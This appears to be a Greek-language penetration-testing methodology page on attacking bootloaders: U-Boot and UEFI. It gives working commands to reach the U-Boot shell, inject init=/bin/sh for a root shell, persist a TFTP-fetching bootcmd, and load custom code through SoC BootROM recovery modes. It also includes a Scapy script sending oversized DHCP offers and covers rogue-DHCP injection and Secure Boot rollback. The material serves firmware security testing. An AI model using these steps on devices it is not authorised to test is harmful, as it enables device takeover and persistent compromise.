# Δοκιμές bootloader

{{#include ../../banners/hacktricks-training.md}}

Τα παρακάτω βήματα προτείνονται για την τροποποίηση ρυθμίσεων εκκίνησης συσκευής και τον έλεγχο bootloaders όπως U-Boot και UEFI-class loaders. Επικεντρωθείτε στην απόκτηση πρώιμης εκτέλεσης κώδικα, στην αξιολόγηση των προστασιών υπογραφής/rollback, και στην κατάχρηση διαδρομών ανάκτησης ή network-boot.

## U-Boot quick wins and environment abuse

1. Πρόσβαση στο interpreter shell
- Κατά την εκκίνηση, πατήστε ένα γνωστό πλήκτρο διακοπής (συχνά οποιοδήποτε πλήκτρο, 0, space, ή μια πλατφόρμα-ειδική "magic" ακολουθία) πριν εκτελεστεί το `bootcmd` για να μεταβείτε στο prompt του U-Boot.

2. Επιθεώρηση κατάστασης εκκίνησης και μεταβλητών
- Χρήσιμα commands:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Τροποποίηση boot arguments για root shell
- Προσθέστε `init=/bin/sh` ώστε ο kernel να πέσει σε shell αντί για το κανονικό init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot από τον TFTP server σας
- Διαμορφώστε το δίκτυο και φέρετε ένα kernel/fit image από το LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Επίμονη αλλαγή μέσω environment
- Αν ο χώρος αποθήκευσης env δεν είναι write-protected, μπορείτε να αποθηκεύσετε τον έλεγχο:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν fallback paths. Λανθασμένες τιμές μπορούν να παρέχουν επαναλαμβανόμενες εισόδους στο shell.

6. Έλεγχος debug/unsafe λειτουργιών
- Ψάξτε για: `bootdelay` > 0, `autoboot` απενεργοποιημένο, ανεξέλεγκτο `usb start; fatload usb 0:1 ...`, δυνατότητα `loady`/`loads` μέσω serial, `env import` από μη αξιόπιστα μέσα, και kernels/ramdisks φορτωμένα χωρίς έλεγχο υπογραφών.

7. U-Boot image/verification testing
- Αν η πλατφόρμα δηλώνει secure/verified boot με FIT images, δοκιμάστε τόσο unsigned όσο και τροποποιημένα images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Η απουσία `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η legacy συμπεριφορά `verify=n` συχνά επιτρέπει το boot arbitrary payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- Η legacy BOOTP/DHCP υλοποίηση του U-Boot είχε ζητήματα ασφάλειας μνήμης. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει memory disclosure μέσω crafted DHCP responses που μπορούν να leak bytes από τη μνήμη του U-Boot πίσω στο δίκτυο. Δοκιμάστε τις DHCP/PXE διαδρομές με υπερβολικά μεγάλες/edge-case τιμές (option 67 bootfile-name, vendor options, file/servername fields) και παρατηρήστε για hangs/leaks.
- Minimal Scapy snippet to stress boot parameters during netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Επίσης επιβεβαιώστε αν τα PXE filename fields περάγονται στη shell/loader λογική χωρίς sanitization όταν συνδέονται σε OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Στήστε ένα rogue DHCP/PXE service και δοκιμάστε την έγχυση χαρακτήρων σε filename ή options fields για να φτάσετε σε command interpreters σε μεταγενέστερα στάδια της αλυσίδας εκκίνησης. Το Metasploit’s DHCP auxiliary, `dnsmasq`, ή custom Scapy scripts δουλεύουν καλά. Διασφαλίστε ότι απομονώνετε πρώτα το lab network.

## SoC ROM recovery modes that override normal boot

Πολλά SoC εκθέτουν έναν BootROM "loader" mode που θα δεχτεί κώδικα πάνω από USB/UART ακόμη και όταν τα flash images είναι μη έγκυρα. Αν τα secure-boot fuses δεν έχουν καεί, αυτό μπορεί να παρέχει arbitrary code execution πολύ νωρίς στην αλυσίδα.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Αξιολογήστε αν η συσκευή έχει secure-boot eFuses/OTP καμένες. Αν όχι, τα BootROM download modes συχνά παρακάμπτουν οποιοδήποτε υψηλότερου επιπέδου verification (U-Boot, kernel, rootfs) εκτελώντας το first-stage payload απευθείας από SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount the EFI System Partition (ESP) και ελέγξτε για loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Προσπαθήστε να κάνετε boot με downgraded ή γνωστά-ευάλωτα signed boot components αν τα Secure Boot revocations (dbx) δεν είναι ενημερωμένα. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε τον δικό σας kernel ή `grub.cfg` από το ESP για να αποκτήσετε επίμονη πρόσβαση.

11. Boot logo parsing bugs (LogoFAIL class)
- Πολλά OEM/IBV firmwares ήταν ευάλωτα σε image-parsing flaws στο DXE που επεξεργάζονται boot logos. Αν ένας επιτιθέμενος μπορεί να τοποθετήσει μια crafted εικόνα στο ESP κάτω από ένα vendor-specific path (π.χ., `\EFI\<vendor>\logo\*.bmp`) και να κάνει reboot, η εκτέλεση κώδικα κατά την πρώιμη εκκίνηση μπορεί να είναι δυνατή ακόμη και με Secure Boot ενεργό. Δοκιμάστε αν η πλατφόρμα δέχεται user-supplied logos και αν αυτοί οι φάκελοι είναι εγγράψιμοι από το OS.

## Hardware caution

Να είστε προσεκτικοί όταν αλληλεπιδράτε με SPI/NAND flash κατά την πρώιμη εκκίνηση (π.χ., γειώνοντας pins για να παρακάμψετε reads) και πάντα συμβουλευτείτε το flash datasheet. Λανθασμένα timed shorts μπορούν να καταστρέψουν τη συσκευή ή τον programmer.

## Σημειώσεις και επιπλέον συμβουλές

- Δοκιμάστε `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μεταφέρετε environment blobs μεταξύ RAM και storage; μερικές πλατφόρμες επιτρέπουν import env από αφαιρούμενα μέσα χωρίς authentication.
- Για persistence σε Linux-based συστήματα που κάνουν boot μέσω `extlinux.conf`, η τροποποίηση της γραμμής `APPEND` (για εισαγωγή `init=/bin/sh` ή `rd.break`) στο boot partition συχνά αρκεί όταν δεν υπάρχουν έλεγχοι υπογραφών.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επαληθεύστε ότι το `/etc/fw_env.config` ταιριάζει με τον πραγματικό χώρο env. Λανθασμένες offsets σας επιτρέπουν να διαβάσετε/γράψετε την λάθος MTD περιοχή.

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
